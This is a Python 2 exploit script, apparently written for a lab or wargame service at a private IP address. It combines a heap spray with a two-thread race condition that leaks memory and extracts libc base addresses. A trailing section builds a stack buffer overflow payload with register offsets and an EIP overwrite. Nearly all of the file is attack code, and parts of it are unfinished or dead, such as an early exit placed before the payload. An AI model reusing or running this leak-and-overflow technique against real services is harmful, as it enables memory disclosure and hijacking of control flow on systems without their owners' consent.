#!/usr/bin/python
import socket
import struct
import ssl
import time
import telnetlib
import threading
import re
import sys
from collections import Counter


v = ('192.168.56.101', 20006)


# connection 
def connect(v):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(v)
	time.sleep(0.1)
	s = ssl.wrap_socket(s)
	time.sleep(0.1)
	print s.recv(1024)
	return s

# heavy spray
def heavyspray(v):
	v = connect(v)
	for i in range(600):
		v.send('s {} {}\n'.format(i, 'A'*400))
		time.sleep(0.001)
		v.recv(1024)
	v.close()
	return


# 
def extractaddr(data):
	data = data[::-1]
	b7 = re.findall('\xb7...', data)
	b8 = re.findall('\xb8...', data)

	if len(b8)<len(b7):
		b = [struct.unpack(">I", i)[0] for i in b7]
	else:
		b = [struct.unpack(">I", i)[0] for i in b8]
	b = [int(((i >> 12)<< 12)) for i in b]
	b.sort()
	print 'Complete : ', b
	for i in b:
		print hex(i)
	data = Counter(b)
	print "[-] Most Occured Address : ", data.most_common(1)[0]
	print "[-] Maybe Our Libc Addrss : ", hex(0xb76d9000-0x179000)
	return 



# MainEngine For Updating Data Regularly
class MainEngine(threading.Thread):
	def __init__(self, v):
		threading.Thread.__init__(self)
		self.s = connect(v)
		self.runcycle = True

	def run(self):
		print "[*] Main Engine Started."
	        buf1 = "B"*150
        	buf2 = "A"*150
        	size = len(buf1)
        	key = "test"
		while self.runcycle:
		                self.s.send("s {} {}\n".format(key, size))
                		self.s.send("{}\n".format(buf1))
		self.s.send('exit\n')
		self.s.close()	
		print "[*] Main Engine Close."
		return

# Back Engine For Reading Data Regularly
class BackEngine(threading.Thread):
	def __init__(self, v, engine):
		threading.Thread.__init__(self)
		self.engine = engine
		self.v = connect(v)
		
	def run(self):
		print "[*] Back Engine Start"
		while True:
			self.v.send('g test\n')
                	chk = self.v.recv(1024)                	
                	if chk:
                        	if ('\xb6' in chk) or ('\xb7' in chk) or ('\xb8' in chk) or ('\xb9' in chk):
                                	print [chk]
					self.engine.runcycle = False
					self.v.close()
					print "[*] Back Engine Close"
					extractaddr(chk)
					return
		return


def main(v):
	#raw_input('Heavy Spray Start')
	#heavyspray(v)
	raw_input('Data Leak Start')
	thread = MainEngine(v)
	#time.sleep(1)
	thread1 = BackEngine(v, thread)
	thread.start()
	time.sleep(0.1)
	thread1.start()
	print '[+] Waiting For Response.'
	thread1.join()
	print '[-] Extracting Data From Response.'
	return

if 'leak' in sys.argv:
	main(v)

elif 'spray' in sys.argv:
	raw_input('Heavy Spray Start')
        heavyspray(v)
	print "[*] Spray Complete."
else:
	print "[*] Please Provide Usages Arguments : leak, spray"

exit(0)


# Payload
# EIP = 60
# EDI = 52
# ESI = 48
# EBP = 56
# EBX  = 44


payload = 'A'*44  # Paddings
payload += 'BBBB' # EBX
payload += 'CCCC' # ESI
payload += 'DDDD' # EDI
payload += 'EEEE' # EBP
payload += 'FFFF' # EIP


# Got Control Over 
# EAX = EAX - 
# EDX = 64 Offset 
# ESI = 64 Offset
#  mov    eax,DWORD PTR [esi+0x55c]

addr = 0xb74bf000 # libc base address
addr += 0x10 # why 0x10 ? hmm, little brute force  testing
bof = payload
bof += struct.pack('I', addr + 12) # Just Paddings
bof += struct.pack('I', addr + 8) 
bof += struct.pack('I', addr + 4) 
bof = 'A'*64+ struct.pack('I', 0xb73e619c)




